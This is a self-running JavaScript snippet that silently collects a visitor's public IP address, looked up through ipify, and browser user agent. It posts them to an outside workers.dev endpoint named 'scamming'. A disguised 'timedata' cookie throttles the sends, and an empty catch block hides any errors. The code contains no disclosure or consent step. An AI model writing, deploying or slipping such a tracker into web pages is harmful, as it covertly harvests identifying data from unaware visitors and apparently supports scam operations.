(async () => {
  try {
    const COOKIE_NAME = "timedata";
    const THREE_MINUTES = 3 * 60 * 1000;

    const cookies = document.cookie.split("; ").reduce((acc, c) => {
      const [k, v] = c.split("=");
      acc[k] = v;
      return acc;
    }, {});

    const lastSent = parseInt(cookies[COOKIE_NAME] || "0", 10);
    const now = Date.now();

    if (now - lastSent < THREE_MINUTES) return;

    const ipRes = await fetch("https://api.ipify.org/");
    const ip = await ipRes.text();
    const ua = navigator.userAgent;

    const text = `ip: ${ip}\nuseragent: ${ua}`;

    await fetch("https://solitary-smoke-4943.scamming.workers.dev/", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ text })
    });

    document.cookie = `${COOKIE_NAME}=${now}; max-age=${60 * 60 * 24 * 365}; path=/`;
  } catch (e) {}
})();
